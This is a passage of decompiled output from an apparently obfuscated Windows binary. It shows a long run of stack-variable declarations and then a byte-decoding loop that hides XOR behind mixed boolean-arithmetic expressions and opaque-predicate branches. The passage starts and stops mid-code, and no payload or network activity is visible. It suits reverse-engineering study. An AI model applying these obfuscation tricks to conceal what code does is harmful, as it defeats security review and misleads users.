iStackY10588;\n    int32_t iStackY10488;\n    uint32_t uStackY10484;\n    uint32_t uStackY10480;\n    uint8_t uStackY10473;\n    uint32_t uStackY10472;\n    int32_t iStackY10468;\n    uint32_t uStackY10464;\n    uint32_t uStackY10460;\n    uint8_t uStackY10453;\n    uint32_t uStackY10452;\n    int32_t iStackY10348;\n    uint32_t uStackY10344;\n    uint32_t uStackY10340;\n    uint8_t uStackY10333;\n    uint32_t uStackY10332;\n    uint32_t uStackY10268;\n    int32_t iStackY10228;\n    uint32_t uStackY10224;\n    uint32_t uStackY10220;\n    uint8_t uStackY10213;\n    uint32_t uStackY10212;\n    uint32_t uStackY10160;\n    int32_t iStackY10108;\n    uint32_t uStackY10104;\n    uint32_t uStackY10100;\n    uint8_t uStackY10093;\n    uint32_t uStackY10092;\n    uint32_t uStackY10052;\n    int32_t iStackY9988;\n    uint32_t uStackY9984;\n    uint32_t uStackY9980;\n    uint8_t uStackY9973;\n    uint32_t uStackY9972;\n    uint32_t uStackY9944;\n    int32_t iStackY9868;\n    uint32_t uStackY9864;\n    uint32_t uStackY9860;\n    uint8_t uStackY9853;\n    uint32_t uStackY9852;\n    uint32_t uStackY9836;\n    int32_t iStackY9748;\n    uint32_t uStackY9744;\n    uint32_t uStackY9740;\n    uint8_t uStackY9733;\n    uint32_t uStackY9732;\n    uint32_t uStackY9728;\n    int32_t iStackY9628;\n    uint32_t uStackY9624;\n    uint32_t uStackY9620;\n    uint8_t uStackY9613;\n    uint32_t uStackY9612;\n    uint32_t uStackY9536;\n    int32_t iStackY9508;\n    uint32_t uStackY9504;\n    uint32_t uStackY9500;\n    uint8_t uStackY9493;\n    uint32_t uStackY9492;\n    uint32_t uStackY9428;\n    int32_t iStackY9388;\n    uint32_t uStackY9384;\n    uint32_t uStackY9380;\n    uint8_t uStackY9373;\n    uint32_t uStackY9372;\n    int32_t iStackY9320;\n    int32_t iStackY9268;\n    uint32_t uStackY9264;\n    uint32_t uStackY9260;\n    uint8_t uStackY9253;\n    uint32_t uStackY9252;\n    int32_t iStackY9148;\n    uint32_t uStackY9144;\n    uint32_t uStackY9140;\n    uint8_t uStackY9133;\n    uint32_t uStackY9132;\n    uint32_t uStackY9104;\n    int32_t iStackY9028;\n    uint32_t uStackY9024;\n    uint32_t uStackY9020;\n    uint8_t uStackY9013;\n    uint32_t uStackY9012;\n    uint32_t uStackY8996;\n    int32_t iStackY8908;\n    uint32_t uStackY8904;\n    uint32_t uStackY8900;\n    uint8_t uStackY8893;\n    uint32_t uStackY8892;\n    uint32_t uStackY8888;\n    int32_t iStackY8788;\n    uint32_t uStackY8784;\n    uint32_t uStackY8780;\n    uint8_t uStackY8773;\n    uint32_t uStackY8772;\n    uint32_t uStackY8696;\n    int32_t iStackY8668;\n    uint32_t uStackY8664;\n    uint32_t uStackY8660;\n    uint8_t uStackY8653;\n    uint32_t uStackY8652;\n    uint32_t uStackY8588;\n    int32_t iStackY8548;\n    uint32_t uStackY8544;\n    uint32_t uStackY8540;\n    uint8_t uStackY8533;\n    uint32_t uStackY8532;\n    uint32_t uStackY8480;\n    int32_t iStackY8428;\n    uint32_t uStackY8424;\n    uint32_t uStackY8420;\n    uint8_t uStackY8413;\n    uint32_t uStackY8412;\n    uint32_t uStackY8372;\n    int32_t iStackY8308;\n    uint32_t uStackY8304;\n    uint32_t uStackY8300;\n    uint8_t uStackY8293;\n    uint32_t uStackY8292;\n    uint32_t uStackY8264;\n    int32_t iStackY8188;\n    uint32_t uStackY8184;\n    uint32_t uStackY8180;\n    uint8_t uStackY8173;\n    uint32_t uStackY8172;\n    int32_t iStackY8156;\n    int32_t iStackY7968;\n    uint32_t uStackY7964;\n    uint32_t uStackY7960;\n    uint8_t uStackY7953;\n    uint32_t uStackY7952;\n    uint32_t uStackY7912;\n    int32_t iStackY7848;\n    uint32_t uStackY7844;\n    uint32_t uStackY7840;\n    uint8_t uStackY7833;\n    uint32_t uStackY7832;\n    uint32_t uStackY7804;\n    int32_t iStackY7728;\n    uint32_t uStackY7724;\n    uint32_t uStackY7720;\n    uint8_t uStackY7713;\n    uint32_t uStackY7712;\n    uint32_t uStackY7696;\n    int32_t iStackY7608;\n    uint32_t uStackY7604;\n    uint32_t uStackY7600;\n    uint8_t uStackY7593;\n    uint32_t uStackY7592;\n    uint32_t uStackY7588;\n    int32_t iStackY7488;\n    uint32_t uStackY7484;\n    uint32_t uStackY7480;\n    uint8_t uStackY7473;\n    uint32_t uStackY7472;\n    uint32_t uStackY7380;\n    int32_t iStackY7368;\n    uint32_t uStackY7364;\n    uint32_t uStackY7360;\n    uint8_t uStackY7353;\n    uint32_t uStackY7352;\n    uint32_t uStackY7288;\n    int32_t iStackY7248;\n    uint32_t uStackY7244;\n    uint32_t uStackY7240;\n    uint8_t uStackY7233;\n    uint32_t uStackY7232;\n    uint32_t uStackY7180;\n    int32_t iStackY7128;\n    uint32_t uStackY7124;\n    uint32_t uStackY7120;\n    uint8_t uStackY7113;\n    uint32_t uStackY7112;\n    uint32_t uStackY7072;\n    int32_t iStackY7008;\n    uint32_t uStackY7004;\n    uint32_t uStackY7000;\n    uint8_t uStackY6993;\n    uint32_t uStackY6992;\n    int32_t iStackY6964;\n    int32_t iStackY6828;\n    int32_t iStackY6788;\n    uint32_t uStackY6784;\n    uint32_t uStackY6780;\n    uint8_t uStackY6773;\n    uint32_t uStackY6772;\n    int32_t iStackY6668;\n    uint32_t uStackY6664;\n    uint32_t uStackY6660;\n    uint8_t uStackY6653;\n    uint32_t uStackY6652;\n    uint32_t uStackY6612;\n    int32_t iStackY6548;\n    uint32_t uStackY6544;\n    uint32_t uStackY6540;\n    uint8_t uStackY6533;\n    uint32_t uStackY6532;\n    uint32_t uStackY6504;\n    int32_t iStackY6428;\n    uint32_t uStackY6424;\n    uint32_t uStackY6420;\n    uint8_t uStackY6413;\n    uint32_t uStackY6412;\n    uint32_t uStackY6396;\n    int32_t iStackY6308;\n    uint32_t uStackY6304;\n    uint32_t uStackY6300;\n    uint8_t uStackY6293;\n    uint32_t uStackY6292;\n    uint32_t uStackY6288;\n    int32_t iStackY6188;\n    uint32_t uStackY6184;\n    uint32_t uStackY6180;\n    uint8_t uStackY6173;\n    uint32_t uStackY6172;\n    uint32_t uStackY6080;\n    int32_t iStackY6068;\n    uint32_t uStackY6064;\n    uint32_t uStackY6060;\n    uint8_t uStackY6053;\n    uint32_t uStackY6052;\n    uint32_t uStackY5988;\n    int32_t iStackY5948;\n    uint32_t uStackY5944;\n    uint32_t uStackY5940;\n    uint8_t uStackY5933;\n    uint32_t uStackY5932;\n    uint32_t uStackY5880;\n    int32_t iStackY5828;\n    uint32_t uStackY5824;\n    uint32_t uStackY5820;\n    uint8_t uStackY5813;\n    uint32_t uStackY5812;\n    uint32_t uStackY5772;\n    int32_t iStackY5708;\n    uint32_t uStackY5704;\n    uint32_t uStackY5700;\n    uint8_t uStackY5693;\n    uint32_t uStackY5692;\n    uint32_t uStackY5664;\n    int32_t iStackY5512;\n    int32_t iStackY5488;\n    uint32_t uStackY5484;\n    uint32_t uStackY5480;\n    uint8_t uStackY5473;\n    uint32_t uStackY5472;\n    int32_t iStackY5368;\n    uint32_t uStackY5364;\n    uint32_t uStackY5360;\n    uint8_t uStackY5353;\n    uint32_t uStackY5352;\n    uint32_t uStackY5312;\n    int32_t iStackY5248;\n    uint32_t uStackY5244;\n    uint32_t uStackY5240;\n    uint8_t uStackY5233;\n    uint32_t uStackY5232;\n    uint32_t uStackY5204;\n    int32_t iStackY5128;\n    uint32_t uStackY5124;\n    uint32_t uStackY5120;\n    uint8_t uStackY5113;\n    uint32_t uStackY5112;\n    uint32_t uStackY5096;\n    int32_t iStackY5008;\n    uint32_t uStackY5004;\n    uint32_t uStackY5000;\n    uint8_t uStackY4993;\n    uint32_t uStackY4992;\n    uint32_t uStackY4988;\n    int32_t iStackY4888;\n    uint32_t uStackY4884;\n    uint32_t uStackY4880;\n    uint8_t uStackY4873;\n    uint32_t uStackY4872;\n    uint32_t uStackY4780;\n    int32_t iStackY4768;\n    uint32_t uStackY4764;\n    uint32_t uStackY4760;\n    uint8_t uStackY4753;\n    uint32_t uStackY4752;\n    uint32_t uStackY4672;\n    int32_t iStackY4648;\n    uint32_t uStackY4644;\n    uint32_t uStackY4640;\n    uint8_t uStackY4633;\n    uint32_t uStackY4632;\n    uint32_t uStackY4580;\n    int32_t iStackY4528;\n    uint32_t uStackY4524;\n    uint32_t uStackY4520;\n    uint8_t uStackY4513;\n    uint32_t uStackY4512;\n    uint32_t uStackY4472;\n    int32_t iStackY4408;\n    uint32_t uStackY4404;\n    uint32_t uStackY4400;\n    uint8_t uStackY4393;\n    uint32_t uStackY4392;\n    uint32_t uStackY4364;\n    int32_t iStackY4288;\n    uint32_t uStackY4284;\n    uint32_t uStackY4280;\n    uint8_t uStackY4273;\n    uint32_t uStackY4272;\n    int32_t iStackY4268;\n    uint32_t uStackY4264;\n    uint32_t uStackY4260;\n    uint8_t uStackY4253;\n    uint32_t uStackY4252;\n    int32_t iStackY4248;\n    uint32_t uStackY4244;\n    uint32_t uStackY4240;\n    uint8_t uStackY4233;\n    uint32_t uStackY4232;\n    int32_t iStackY4228;\n    uint32_t uStackY4224;\n    uint32_t uStackY4220;\n    uint8_t uStackY4213;\n    uint32_t uStackY4212;\n    int32_t iStackY4208;\n    uint32_t uStackY4204;\n    uint32_t uStackY4200;\n    uint8_t uStackY4193;\n    uint32_t uStackY4192;\n    int32_t iStackY4188;\n    uint32_t uStackY4184;\n    uint32_t uStackY4180;\n    uint8_t uStackY4173;\n    uint32_t uStackY4172;\n    int32_t iStackY4168;\n    uint32_t uStackY4164;\n    uint32_t uStackY4160;\n    uint8_t uStackY4153;\n    uint32_t uStackY4152;\n    int32_t iStackY4072;\n    int32_t iStackY4048;\n    uint32_t uStackY4044;\n    uint32_t uStackY4040;\n    uint8_t uStackY4033;\n    uint32_t uStackY4032;\n    int32_t iStackY3980;\n    int32_t iStackY3928;\n    uint32_t uStackY3924;\n    uint32_t uStackY3920;\n    uint8_t uStackY3913;\n    uint32_t uStackY3912;\n    int32_t iStackY3872;\n    int32_t iStackY3808;\n    uint32_t uStackY3804;\n    uint32_t uStackY3800;\n    uint8_t uStackY3793;\n    uint32_t uStackY3792;\n    int32_t iStackY3764;\n    int32_t iStackY3688;\n    uint32_t uStackY3684;\n    uint32_t uStackY3680;\n    uint8_t uStackY3673;\n    uint32_t uStackY3672;\n    int32_t iStackY3656;\n    int32_t iStackY3568;\n    uint32_t uStackY3564;\n    uint32_t uStackY3560;\n    uint8_t uStackY3553;\n    uint32_t uStackY3552;\n    int32_t iStackY3548;\n    int32_t iStackY3448;\n    uint32_t uStackY3444;\n    uint32_t uStackY3440;\n    uint8_t uStackY3433;\n    uint32_t uStackY3432;\n    int32_t iStackY3340;\n    int32_t iStackY3328;\n    uint32_t uStackY3324;\n    uint32_t uStackY3320;\n    uint8_t uStackY3313;\n    uint32_t uStackY3312;\n    int32_t iStackY3232;\n    int32_t iStackY3208;\n    uint32_t uStackY3204;\n    uint32_t uStackY3200;\n    uint8_t uStackY3193;\n    uint32_t uStackY3192;\n    int32_t iStackY3124;\n    int32_t iStackY3088;\n    uint32_t uStackY3084;\n    uint32_t uStackY3080;\n    uint8_t uStackY3073;\n    uint32_t uStackY3072;\n    int32_t iStackY3032;\n    int32_t iStackY2880;\n    int32_t iStackY2844;\n    int32_t iStackY2692;\n    int32_t iStackY2668;\n    uint32_t uStackY2664;\n    uint32_t uStackY2660;\n    uint8_t uStackY2653;\n    uint32_t uStackY2652;\n    int32_t iStackY2584;\n    int32_t iStackY2548;\n    uint32_t uStackY2544;\n    uint32_t uStackY2540;\n    uint8_t uStackY2533;\n    uint32_t uStackY2532;\n    int32_t iStackY2492;\n    int32_t iStackY2428;\n    uint32_t uStackY2424;\n    uint32_t uStackY2420;\n    uint8_t uStackY2413;\n    uint32_t uStackY2412;\n    int32_t iStackY2384;\n    int32_t iStackY2308;\n    uint32_t uStackY2304;\n    uint32_t uStackY2300;\n    uint8_t uStackY2293;\n    uint32_t uStackY2292;\n    int32_t iStackY2276;\n    int32_t iStackY2188;\n    uint32_t uStackY2184;\n    uint32_t uStackY2180;\n    uint8_t uStackY2173;\n    uint32_t uStackY2172;\n    int32_t iStackY2168;\n    int32_t iStackY2068;\n    uint32_t uStackY2064;\n    uint32_t uStackY2060;\n    uint8_t uStackY2053;\n    uint32_t uStackY2052;\n    int32_t iStackY1960;\n    int32_t iStackY1948;\n    uint32_t uStackY1944;\n    uint32_t uStackY1940;\n    uint8_t uStackY1933;\n    uint32_t uStackY1932;\n    int32_t iStackY1852;\n    int32_t iStackY1828;\n    uint32_t uStackY1824;\n    uint32_t uStackY1820;\n    uint8_t uStackY1813;\n    uint32_t uStackY1812;\n    int32_t iStackY1744;\n    int32_t iStackY1708;\n    uint32_t uStackY1704;\n    uint32_t uStackY1700;\n    uint8_t uStackY1693;\n    uint32_t uStackY1692;\n    int32_t iStackY1652;\n    int32_t iStackY1500;\n    int32_t iStackY1464;\n    int32_t iStackY1312;\n    int32_t iStackY1288;\n    uint32_t uStackY1284;\n    uint32_t uStackY1280;\n    uint8_t uStackY1273;\n    uint32_t uStackY1272;\n    int32_t iStackY1204;\n    int32_t iStackY1168;\n    uint32_t uStackY1164;\n    uint32_t uStackY1160;\n    uint8_t uStackY1153;\n    uint32_t uStackY1152;\n    int32_t iStackY1112;\n    int32_t iStackY1048;\n    uint32_t uStackY1044;\n    uint32_t uStackY1040;\n    uint8_t uStackY1033;\n    uint32_t uStackY1032;\n    int32_t iStackY1004;\n    int32_t iStackY928;\n    uint32_t uStackY924;\n    uint32_t uStackY920;\n    uint8_t uStackY913;\n    uint32_t uStackY912;\n    int32_t iStackY896;\n    int32_t iStackY808;\n    uint32_t uStackY804;\n    uint32_t uStackY800;\n    uint8_t uStackY793;\n    uint32_t uStackY792;\n    int32_t iStackY788;\n    int32_t iStackY688;\n    uint32_t uStackY684;\n    uint32_t uStackY680;\n    uint8_t uStackY673;\n    uint32_t uStackY672;\n    int32_t iStackY580;\n    int32_t iStackY568;\n    uint32_t uStackY564;\n    uint32_t uStackY560;\n    uint8_t uStackY553;\n    uint32_t uStackY552;\n    int32_t iStackY472;\n    int32_t iStackY448;\n    uint32_t uStackY444;\n    uint32_t uStackY440;\n    uint8_t uStackY433;\n    uint32_t uStackY432;\n    int32_t iStackY364;\n    int32_t iStackY328;\n    uint32_t uStackY324;\n    uint32_t uStackY320;\n    uint8_t uStackY313;\n    uint32_t uStackY312;\n    int32_t iStackY256;\n    int32_t iStackY120;\n    int32_t iStackY84;\n    uint uStackY20;\n    \n    fcn.00401de8();\n    uStackY10668 = 0;\n    cStackY10673 = '\\x01';\n    while (cStackY10673 == '\\x01') {\n        cStackY10673 = '\\0';\n    }\n    cStackY10674 = '\\x01';\n    while (cStackY10674 == '\\x01') {\n        cStackY10674 = '\\0';\n    }\n    uStackY10672 = 499;\n    cStackY10675 = '\\x01';\n    while (cStackY10675 == '\\x01') {\n        uStackY10672 = 0x11e5;\n        cStackY10675 = '\\0';\n    }\n    uStackY10656 = 0x8233f26;\n    puStackY10660 = &uStackY10692;\n    uStackY10616 = 0;\n    uStackY10617 = 0x26;\n    uStackY10692 = 0xd6;\n    uStackY10624 = 1;\n    uStackY10625 = 0x3f;\n    uStackY10691 = 0xfe;\n    uStackY10632 = 2;\n    uStackY10633 = 0x23;\n    uStackY10690 = 0xd1;\n    uStackY10640 = 3;\n    uStackY10641 = 8;\n    uStackY10689 = 0x2b;\n    puStackY10712 = auStackY10688;\n    puStackY10652 = puStackY10660;\n    do {\n        *puStackY10712 = 0;\n        puStackY10712 = puStackY10712 + 1;\n    } while (puStackY10712 != &uStackY10676);\n    puStackY10648 = &uStackY10692;\n    puStackY10596 = puStackY10648;\ncode_r0x00413640:\n    puVar4 = fcn.004043b3();\n    uStackY10604 = *puVar4;\n    puVar4 = fcn.00402487();\n    uStackY10608 = *puVar4;\ncode_r0x0041365a:\n    uStackY10612 = 0;\n    do {\n        if (0xf < uStackY10612) {\n            puStackY10592 = puStackY10596;\ncode_r0x00417e8f:\n            fcn.00402ba8(*puStackY10592);\n            (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)();\n            uStackY20 = 0x417ec3;\n            fcn.00406681();\n            uStackY20 = 0x417edd;\n            fcn.00404d5e(0x541f1, 0xd3905);\n            return 0;\n        }\n        uStackY10597 = *(puStackY10596 + uStackY10612);\ncode_r0x00413686:\n        uVar2 = uStackY10604;\n        uVar6 = uStackY10608;\n        if (uStackY10612 < uStackY10604) {\n            puStackY10592 = puStackY10596 + 0x4b883e;\n            goto code_r0x00417e8f;\n        }\n        fcn.00405830();\n        uVar3 = uStackY10604;\n        uVar1 = uStackY10608;\n        if (uVar6 + iStackY10588 <= uVar2) {\n            fcn.00405830();\n            uVar2 = uStackY10604;\n            uVar6 = uStackY10608;\n            if (uVar3 != uVar1 + 1) {\n                fcn.00405830();\n                uVar3 = uStackY10604;\n                uVar1 = uStackY10608;\n                if (uVar2 == uVar6 + (uStackY10268 & 1) + 1) {\n                    uStackY10212 = uStackY10612;\n                    uStackY10213 = uStackY10597;\n                    uStackY10220 = uStackY10597;\n                    uStackY10224 = uStackY10612 + 0x292d5b38;\n                    iStackY10228 = (uStackY10220 + uStackY10224) -\n                                   ((uStackY10220 & uStackY10224) + (uStackY10224 & uStackY10220));\n                    uStackY10598 = iStackY10228 + 0x78;\n                    goto code_r0x00416560;\n                }\n                fcn.00405830();\n                uVar2 = uStackY10604;\n                uVar6 = uStackY10608;\n                if (uVar3 == uVar1 + uStackY10160 % 3 + 1) {\n                    uStackY10092 = uStackY10612;\n                    uStackY10093 = uStackY10597;\n                    uStackY10100 = uStackY10597;\n                    uStackY10104 = uStackY10612 + 0x672b2e8;\n                    iStackY10108 = (uStackY10100 + uStackY10104) -\n                                   ((uStackY10100 & uStackY10104) + (uStackY10104 & uStackY10100));\n                    uStackY10598 = iStackY10108 + 0xa8;\n                    goto code_r0x0041649f;\n                }\n                fcn.00405830();\n                uVar3 = uStackY10604;\n                uVar1 = uStackY10608;\n                if (uVar2 != uVar6 + (uStackY10052 & 3) + 1) {\n                    fcn.00405830();\n                    uVar2 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar3 != uVar1 + uStackY9944 % 5 + 1) {\n                        fcn.00405830();\n                        uVar3 = uStackY10604;\n                        uVar1 = uStackY10608;\n                        if (uVar2 != uVar6 + uStackY9836 % 6 + 1) {\n                            fcn.00405830();\n                            uVar2 = uStackY10604;\n                            uVar6 = uStackY10608;\n                            if (uVar3 != uVar1 + uStackY9728 % 7 + 1) {\n                                fcn.00405830();\n                                uVar3 = uStackY10604;\n                                uVar1 = uStackY10608;\n                                if (uVar2 != uVar6 + (uStackY9536 & 7) + 1) {\n                                    fcn.00405830();\n                                    if (uVar3 != uVar1 + uStackY9428 % 9 + 1) goto code_r0x00413ef5;\n                                    uStackY9372 = uStackY10612;\n                                    uStackY9373 = uStackY10597;\n                                    uStackY9380 = uStackY10597;\n                                    uStackY9384 = uStackY10612 + 0x3612c108;\n                                    iStackY9388 = (uStackY9380 + uStackY9384) -\n                                                  ((uStackY9380 & uStackY9384) + (uStackY9384 & uStackY9380));\n                                    uStackY10598 = iStackY9388 - 0x38;\n                                    goto code_r0x004161fd;\n                                }\n                                uStackY9492 = uStackY10612;\n                                uStackY9493 = uStackY10597;\n                                uStackY9500 = uStackY10597;\n                                uStackY9504 = uStackY10612 + 0x58cd6958;\n                                iStackY9508 = (uStackY9500 + uStackY9504) -\n                                              ((uStackY9500 & uStackY9504) + (uStackY9504 & uStackY9500));\n                                uStackY10598 = iStackY9508 + 0x98;\n                                goto code_r0x0041627d;\n                            }\n                            uStackY9612 = uStackY10612;\n                            uStackY9613 = uStackY10597;\n                            uStackY9620 = uStackY10597;\n                            uStackY9624 = uStackY10612 + 0x7b8811a8;\n                            iStackY9628 = (uStackY9620 + uStackY9624) -\n                                          ((uStackY9620 & uStackY9624) + (uStackY9624 & uStackY9620));\n                            uStackY10598 = iStackY9628 + 0x68;\n                            goto code_r0x0041628c;\n                        }\n                        uStackY9732 = uStackY10612;\n                        uStackY9733 = uStackY10597;\n                        uStackY9740 = uStackY10597;\n                        uStackY9744 = uStackY10612 + 0x9e42b9f8;\n                        iStackY9748 = (uStackY9740 + uStackY9744) -\n                                      ((uStackY9740 & uStackY9744) + (uStackY9744 & uStackY9740));\n                        uStackY10598 = iStackY9748 + 0x38;\n                        goto code_r0x00416334;\n                    }\n                    uStackY9852 = uStackY10612;\n                    uStackY9853 = uStackY10597;\n                    uStackY9860 = uStackY10597;\n                    uStackY9864 = uStackY10612 + 0xc0fd6248;\n                    iStackY9868 = (uStackY9860 + uStackY9864) -\n                                  ((uStackY9860 & uStackY9864) + (uStackY9864 & uStackY9860));\n                    uStackY10598 = iStackY9868 + 8;\n                    goto code_r0x004163d0;\n                }\n                uStackY9972 = uStackY10612;\n                uStackY9973 = uStackY10597;\n                uStackY9980 = uStackY10597;\n                uStackY9984 = uStackY10612 + 0xe3b80a98;\n                iStackY9988 = (uStackY9980 + uStackY9984) - ((uStackY9980 & uStackY9984) + (uStackY9984 & uStackY9980));\n                uStackY10598 = iStackY9988 - 0x28;\n                goto code_r0x004163e2;\n            }\n            uStackY10332 = uStackY10612;\n            uStackY10333 = uStackY10597;\n            uStackY10340 = uStackY10597;\n            uStackY10344 = uStackY10612 + 0x4be80388;\n            iStackY10348 = (uStackY10340 + uStackY10344) -\n                           ((uStackY10340 & uStackY10344) + (uStackY10344 & uStackY10340));\n            uStackY10598 = iStackY10348 + 0x48;\n            goto code_r0x00416612;\n        }\n        uStackY10472 = uStackY10612;\n        uStackY10473 = uStackY10597;\n        uStackY10480 = uStackY10597;\n        uStackY10484 = uStackY10612 + 0x6ea2abd8;\n        iStackY10488 = (uStackY10480 + uStackY10484) - ((uStackY10480 & uStackY10484) + (uStackY10484 & uStackY10480));\n        uStackY10598 = iStackY10488 + 0x18;\ncode_r0x00413ef5:\n        uVar2 = uStackY10604;\n        uVar6 = uStackY10608;\n        if (uStackY10612 < uStackY10608) {\n            puStackY10592 = puStackY10596 + 0x52dd48;\n            goto code_r0x00417e8f;\n        }\n        fcn.00405830();\n        uVar3 = uStackY10604;\n        uVar1 = uStackY10608;\n        if (uVar2 < uVar6 + iStackY9320) {\n            uStackY9252 = uStackY10612;\n            uStackY9253 = uStackY10597;\n            uStackY9260 = uStackY10597;\n            uStackY9264 = uStackY10612 + 0x135818b8;\n            iStackY9268 = (uStackY9260 + uStackY9264) - ((uStackY9260 & uStackY9264) + (uStackY9264 & uStackY9260));\n            uStackY10598 = iStackY9268 - 8;\n        }\n        else {\n            fcn.00405830();\n            uVar2 = uStackY10604;\n            uVar6 = uStackY10608;\n            if (uVar3 == uVar1 + 1) {\n                uStackY9132 = uStackY10612;\n                uStackY9133 = uStackY10597;\n                uStackY9140 = uStackY10597;\n                uStackY9144 = uStackY10612 + 0xf09d7068;\n                iStackY9148 = (uStackY9140 + uStackY9144) - ((uStackY9140 & uStackY9144) + (uStackY9144 & uStackY9140));\n                uStackY10598 = iStackY9148 + 0x28;\n                goto code_r0x004161fd;\n            }\n            fcn.00405830();\n            uVar3 = uStackY10604;\n            uVar1 = uStackY10608;\n            if (uVar2 == uVar6 + (uStackY9104 & 1) + 1) {\n                uStackY9012 = uStackY10612;\n                uStackY9013 = uStackY10597;\n                uStackY9020 = uStackY10597;\n                uStackY9024 = uStackY10612 + 0xcde2c818;\n                iStackY9028 = (uStackY9020 + uStackY9024) - ((uStackY9020 & uStackY9024) + (uStackY9024 & uStackY9020));\n                uStackY10598 = iStackY9028 + 0x58;\n                goto code_r0x0041627d;\n            }\n            fcn.00405830();\n            uVar2 = uStackY10604;\n            uVar6 = uStackY10608;\n            if (uVar3 == uVar1 + uStackY8996 % 3 + 1) {\n                uStackY8892 = uStackY10612;\n                uStackY8893 = uStackY10597;\n                uStackY8900 = uStackY10597;\n                uStackY8904 = uStackY10612 + 0xab281fc8;\n                iStackY8908 = (uStackY8900 + uStackY8904) - ((uStackY8900 & uStackY8904) + (uStackY8904 & uStackY8900));\n                uStackY10598 = iStackY8908 + 0x88;\n                goto code_r0x0041628c;\n            }\n            fcn.00405830();\n            uVar3 = uStackY10604;\n            uVar1 = uStackY10608;\n            if (uVar2 == uVar6 + (uStackY8888 & 3) + 1) {\n                uStackY8772 = uStackY10612;\n                uStackY8773 = uStackY10597;\n                uStackY8780 = uStackY10597;\n                uStackY8784 = uStackY10612 + 0x886d7778;\n                iStackY8788 = (uStackY8780 + uStackY8784) - ((uStackY8780 & uStackY8784) + (uStackY8784 & uStackY8780));\n                uStackY10598 = iStackY8788 + 0xb8;\n                goto code_r0x00416334;\n            }\n            fcn.00405830();\n            uVar2 = uStackY10604;\n            uVar6 = uStackY10608;\n            if (uVar3 == uVar1 + uStackY8696 % 5 + 1) {\n                uStackY8652 = uStackY10612;\n                uStackY8653 = uStackY10597;\n                uStackY8660 = uStackY10597;\n                uStackY8664 = uStackY10612 + 0x65b2cf28;\n                iStackY8668 = (uStackY8660 + uStackY8664) - ((uStackY8660 & uStackY8664) + (uStackY8664 & uStackY8660));\n                uStackY10598 = iStackY8668 - 0x18;\n                goto code_r0x004163d0;\n            }\n            fcn.00405830();\n            uVar3 = uStackY10604;\n            uVar1 = uStackY10608;\n            if (uVar2 == uVar6 + uStackY8588 % 6 + 1) {\n                uStackY8532 = uStackY10612;\n                uStackY8533 = uStackY10597;\n                uStackY8540 = uStackY10597;\n                uStackY8544 = uStackY10612 + 0x42f826d8;\n                iStackY8548 = (uStackY8540 + uStackY8544) - ((uStackY8540 & uStackY8544) + (uStackY8544 & uStackY8540));\n                uStackY10598 = iStackY8548 + 0x18;\n                goto code_r0x004163e2;\n            }\n            fcn.00405830();\n            uVar2 = uStackY10604;\n            uVar6 = uStackY10608;\n            if (uVar3 == uVar1 + uStackY8480 % 7 + 1) {\n                uStackY8412 = uStackY10612;\n                uStackY8413 = uStackY10597;\n                uStackY8420 = uStackY10597;\n                uStackY8424 = uStackY10612 + 0x203d7e88;\n                iStackY8428 = (uStackY8420 + uStackY8424) - ((uStackY8420 & uStackY8424) + (uStackY8424 & uStackY8420));\n                uStackY10598 = iStackY8428 + 0x48;\n                goto code_r0x0041649f;\n            }\n            fcn.00405830();\n            uVar3 = uStackY10604;\n            uVar1 = uStackY10608;\n            if (uVar2 == uVar6 + (uStackY8372 & 7) + 1) {\n                uStackY8292 = uStackY10612;\n                uStackY8293 = uStackY10597;\n                uStackY8300 = uStackY10597;\n                uStackY8304 = uStackY10612 + 0xfd82d638;\n                iStackY8308 = (uStackY8300 + uStackY8304) - ((uStackY8300 & uStackY8304) + (uStackY8304 & uStackY8300));\n                uStackY10598 = iStackY8308 + 0x78;\n                goto code_r0x00416560;\n            }\n            fcn.00405830();\n            if (uVar3 == uVar1 + uStackY8264 % 9 + 1) {\n                uStackY8172 = uStackY10612;\n                uStackY8173 = uStackY10597;\n                uStackY8180 = uStackY10597;\n                uStackY8184 = uStackY10612 + 0xdac82de8;\n                iStackY8188 = (uStackY8180 + uStackY8184) - ((uStackY8180 & uStackY8184) + (uStackY8184 & uStackY8180));\n                uStackY10598 = iStackY8188 + 0xa8;\n                goto code_r0x00416612;\n            }\n        }\n        while (uVar2 = uStackY10604,  uVar6 = uStackY10608,  uStackY10612 < uStackY10604 + uStackY10608) {\n            while( true ) {\n                do {\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar1 == uVar6 + iStackY4072) {\n                        uStackY4032 = uStackY10612;\n                        uStackY4033 = uStackY10597;\n                        uStackY4040 = uStackY10597;\n                        uStackY4044 = uStackY10612 + 0x89e5d6d0;\n                        iStackY4048 = (uStackY4040 + uStackY4044) -\n                                      ((uStackY4040 & uStackY4044) + (uStackY4044 & uStackY4040));\n                        uStackY10598 = iStackY4048 + 0x50;\n                        goto code_r0x004161fd;\n                    }\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar3 == uVar2 + iStackY3980) {\n                        uStackY3912 = uStackY10612;\n                        uStackY3913 = uStackY10597;\n                        uStackY3920 = uStackY10597;\n                        uStackY3924 = uStackY10612 + 0x672b2e80;\n                        iStackY3928 = (uStackY3920 + uStackY3924) -\n                                      ((uStackY3920 & uStackY3924) + (uStackY3924 & uStackY3920));\n                        uStackY10598 = iStackY3928 + 0x80;\n                        goto code_r0x0041627d;\n                    }\n                    fcn.00405830();\n                    uVar3 = uStackY10604;\n                    uVar2 = uStackY10608;\n                    if (uVar1 == uVar6 + iStackY3872) {\n                        uStackY3792 = uStackY10612;\n                        uStackY3793 = uStackY10597;\n                        uStackY3800 = uStackY10597;\n                        uStackY3804 = uStackY10612 + 0x44708630;\n                        iStackY3808 = (uStackY3800 + uStackY3804) -\n                                      ((uStackY3800 & uStackY3804) + (uStackY3804 & uStackY3800));\n                        uStackY10598 = iStackY3808 + 0xb0;\n                        goto code_r0x0041628c;\n                    }\n                    fcn.00405830();\n                    uVar1 = uStackY10604;\n                    uVar6 = uStackY10608;\n                    if (uVar3 == uVar2 + iStackY3764) {\n                        uStackY3672 = uStackY10612;\n                        uStackY3673 = uStackY10597;\n                        uStackY3680 = uStackY10597;\n                        uStackY3684 = uStackY10612 + 0x21b5dde0;\n                        iStackY3688 = (uStackY3680 + uStackY3684) -\n                                      ((uStackY3680 & uStackY3684) + (uStackY3684 & uStackY3680));\n                        uStackY10598 = iStackY3688 - 0x20;\n                        goto 